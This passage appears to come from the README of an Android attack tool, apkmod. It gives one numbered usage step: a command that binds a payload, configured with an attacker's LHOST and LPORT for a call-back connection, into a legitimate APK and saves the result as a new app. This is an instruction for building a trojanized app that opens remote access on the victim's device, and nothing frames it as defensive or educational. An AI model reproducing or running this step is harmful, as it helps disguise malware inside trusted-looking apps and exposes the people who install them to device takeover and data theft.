...
4. For binding `apkmod -b LHOST LPORT /path/to/originalApp.apk /path/to/binded.apk`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk__.
